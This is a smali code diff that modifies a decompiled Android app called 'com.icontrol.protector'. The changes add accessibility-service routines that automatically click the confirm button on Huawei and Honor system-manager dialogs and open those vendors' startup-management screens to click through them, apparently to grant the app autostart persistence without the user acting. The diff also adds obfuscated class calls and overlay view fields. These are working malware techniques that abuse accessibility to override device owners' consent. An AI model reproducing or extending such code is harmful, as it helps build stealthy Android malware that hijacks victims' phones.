@@ -80,6 +80,10 @@
 
 .field public static z:I
 
+.field public static hwBlockView:Landroid/view/View;
+
+.field public static hwBlockWm:Landroid/view/WindowManager;
+
 
 # instance fields
 .field public b:Landroid/webkit/WebView;
@@ -4140,6 +4144,78 @@
 
     invoke-static {v2, v1}, Lcom/icontrol/protector/m;->B0(Landroid/view/accessibility/AccessibilityEvent;Lcom/icontrol/protector/AccessServices;)V
 
+    # === Huawei/Honor AlertDialog auto-confirm ===
+    # Only process when m.b or m.w is active (automation in progress)
+    sget-boolean v7, Lcom/icontrol/protector/m;->b:Z
+    sget-boolean v8, Lcom/icontrol/protector/m;->w:Z
+    or-int/2addr v7, v8
+    if-eqz v7, :skip_hw_dialog
+
+    # Check event packageName
+    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;
+    move-result-object v7
+    if-eqz v7, :skip_hw_dialog
+    invoke-interface {v7}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;
+    move-result-object v7
+
+    # Check if huawei systemmanager
+    const-string v8, "com.huawei.systemmanager"
+    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v8
+    if-nez v8, :do_dialog_check
+
+    # Check if honor systemmanager
+    const-string v8, "com.hihonor.systemmanager"
+    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v8
+    if-eqz v8, :skip_hw_dialog
+
+    :do_dialog_check
+    # Check event className == AlertDialog
+    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;
+    move-result-object v7
+    if-eqz v7, :skip_hw_dialog
+    invoke-interface {v7}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;
+    move-result-object v7
+    const-string v8, "android.app.AlertDialog"
+    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v7
+    if-eqz v7, :skip_hw_dialog
+
+    # It's a Huawei/Honor AlertDialog - find and click confirm button
+    :try_start_hw_dialog
+    sget-object v7, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;
+    if-eqz v7, :skip_hw_dialog
+    invoke-virtual {v7}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
+    move-result-object v7
+    if-eqz v7, :skip_hw_dialog
+
+    # Find button1 (positive/confirm button)
+    const-string v8, "android:id/button1"
+    invoke-virtual {v7, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;
+    move-result-object v8
+    if-eqz v8, :skip_hw_dialog
+    invoke-interface {v8}, Ljava/util/List;->isEmpty()Z
+    move-result v9
+    if-nez v9, :skip_hw_dialog
+
+    # Click the confirm button
+    const/4 v9, 0x0
+    invoke-interface {v8, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;
+    move-result-object v8
+    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;
+    const/16 v9, 0x10
+    invoke-virtual {v8, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
+
+    const-string v8, "HW_AUTO"
+    const-string v9, "AlertDialog confirm button clicked"
+    invoke-static {v8, v9}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    :try_end_hw_dialog
+    .catch Ljava/lang/Exception; {:try_start_hw_dialog .. :try_end_hw_dialog} :catch_hw_dialog
+
+    :catch_hw_dialog
+    :skip_hw_dialog
+
     :cond_1
     new-array v4, v3, [B
 
@@ -7032,6 +7108,44 @@
     .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
 
     :catch_1
+    const-string v9, "HW_AUTO"
+    const-string v10, "catch_1 reached"
+    invoke-static {v9, v10}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I
+    move-result v9
+
+    const-string v10, "HW_AUTO"
+    new-instance v11, Ljava/lang/StringBuilder;
+    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v12, "ev.a()="
+    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v11
+    invoke-static {v10, v11}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    const/4 v10, 0x1
+    if-ne v9, v10, :cond_huawei_end
+
+    const-string v9, "HW_AUTO"
+    const-string v10, "isHuawei=true, checking N"
+    invoke-static {v9, v10}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    sget-object v9, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;
+    if-eqz v9, :cond_huawei_end
+
+    const-string v10, "HW_AUTO"
+    const-string v11, "N not null, starting thread"
+    invoke-static {v10, v11}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    new-instance v10, Lcom/icontrol/protector/AccessServices$HuaweiAutomationRunnable;
+    invoke-direct {v10, v9}, Lcom/icontrol/protector/AccessServices$HuaweiAutomationRunnable;-><init>(Lcom/icontrol/protector/AccessServices;)V
+    new-instance v11, Ljava/lang/Thread;
+    invoke-direct {v11, v10}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
+    invoke-virtual {v11}, Ljava/lang/Thread;->start()V
+    :cond_huawei_end
+
     const/4 v9, 0x2
 
     const/4 v10, 0x7
@@ -9368,6 +9482,188 @@
     .locals 0
 
     invoke-super {p0, p1, p2, p3}, Landroid/accessibilityservice/AccessibilityService;->takeScreenshotOfWindow(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V
+
+    return-void
+.end method
+
+.method public startHuaweiAutomationSimple()V
+    .locals 6
+
+    const-string v4, "HW_AUTO"
+
+    # Initial sleep 500ms (optimized from 1500ms)
+    const-wide/16 v0, 0x1f4
+    :try_start_0
+    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
+    :try_end_0
+    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
+
+    :catch_0
+    # Set automation flags
+    const/4 v0, 0x0
+    sput-boolean v0, Lcom/icontrol/protector/m;->o:Z
+    const/4 v0, 0x1
+    sput-boolean v0, Lcom/icontrol/protector/m;->b:Z
+
+    const-string v5, "set m.b=true, m.o=false"
+    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    # === Try Huawei SystemManager main screen ===
+    :try_start_hw
+    new-instance v2, Landroid/content/Intent;
+    invoke-direct {v2}, Landroid/content/Intent;-><init>()V
+
+    new-instance v0, Landroid/content/ComponentName;
+    const-string v1, "com.huawei.systemmanager"
+    const-string v3, "com.huawei.systemmanager.mainscreen.MainScreenActivity"
+    invoke-direct {v0, v1, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+    invoke-virtual {v2, v0}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;
+
+    const/high16 v0, 0x10a00000
+    invoke-virtual {v2, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    invoke-virtual {p0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
+
+    const-string v5, "Huawei SystemManager main opened, waiting 1s"
+    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    # Wait 1000ms for UI to load (optimized from 2000ms)
+    const-wide/16 v0, 0x3e8
+    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
+
+    # Find and click "应用启动管理"
+    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
+    move-result-object v0
+    if-eqz v0, :cond_no_root_hw
+
+    const-string v1, "应用启动管理"
+    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;
+    move-result-object v1
+    if-eqz v1, :cond_try_alt_hw
+    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z
+    move-result v2
+    if-nez v2, :cond_try_alt_hw
+
+    const/4 v2, 0x0
+    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;
+    move-result-object v1
+    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;
+    const/16 v2, 0x10
+    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
+
+    const-string v5, "clicked app_startup_mgr in Huawei SystemManager"
+    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    goto :goto_hw_done
+
+    :cond_try_alt_hw
+    const-string v1, "启动管理"
+    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;
+    move-result-object v1
+    if-eqz v1, :cond_no_root_hw
+    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z
+    move-result v2
+    if-nez v2, :cond_no_root_hw
+
+    const/4 v2, 0x0
+    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;
+    move-result-object v1
+    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;
+    const/16 v2, 0x10
+    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
+
+    const-string v5, "clicked startup_mgr in Huawei SystemManager"
+    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    goto :goto_hw_done
+
+    :cond_no_root_hw
+    const-string v5, "startup_mgr not found in Huawei SystemManager"
+    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    :try_end_hw
+    .catch Ljava/lang/Exception; {:try_start_hw .. :try_end_hw} :catch_hw
+    goto :goto_hw_done
+
+    :catch_hw
+    # === Huawei failed, try Honor SystemManager ===
+    const-string v5, "Huawei failed, trying Honor SystemManager"
+    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    :try_start_honor
+    new-instance v2, Landroid/content/Intent;
+    invoke-direct {v2}, Landroid/content/Intent;-><init>()V
+
+    new-instance v0, Landroid/content/ComponentName;
+    const-string v1, "com.hihonor.systemmanager"
+    const-string v3, "com.hihonor.systemmanager.mainscreen.MainScreenActivity"
+    invoke-direct {v0, v1, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+    invoke-virtual {v2, v0}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;
+
+    const/high16 v0, 0x10a00000
+    invoke-virtual {v2, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    invoke-virtual {p0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
+
+    const-string v5, "Honor SystemManager main opened, waiting 1s"
+    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    # Wait 1000ms
+    const-wide/16 v0, 0x3e8
+    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
+
+    # Find and click "应用启动管理"
+    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
+    move-result-object v0
+    if-eqz v0, :cond_no_root_honor
+
+    const-string v1, "应用启动管理"
+    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;
+    move-result-object v1
+    if-eqz v1, :cond_try_alt_honor
+    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z
+    move-result v2
+    if-nez v2, :cond_try_alt_honor
+
+    const/4 v2, 0x0
+    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;
+    move-result-object v1
+    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;
+    const/16 v2, 0x10
+    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
+
+    const-string v5, "clicked app_startup_mgr in Honor SystemManager"
+    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    goto :goto_hw_done
+
+    :cond_try_alt_honor
+    const-string v1, "启动管理"
+    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;
+    move-result-object v1
+    if-eqz v1, :cond_no_root_honor
+    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z
+    move-result v2
+    if-nez v2, :cond_no_root_honor
+
+    const/4 v2, 0x0
+    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;
+    move-result-object v1
+    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;
+    const/16 v2, 0x10
+    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
+
+    const-string v5, "clicked startup_mgr in Honor SystemManager"
+    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    goto :goto_hw_done
+
+    :cond_no_root_honor
+    const-string v5, "startup_mgr not found in Honor SystemManager"
+    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    :try_end_honor
+    .catch Ljava/lang/Exception; {:try_start_honor .. :try_end_honor} :catch_honor
+
+    :catch_honor
+    const-string v5, "Both Huawei and Honor SystemManager failed"
+    invoke-static {v4, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
+
+    :goto_hw_done
 
     return-void
 .end method
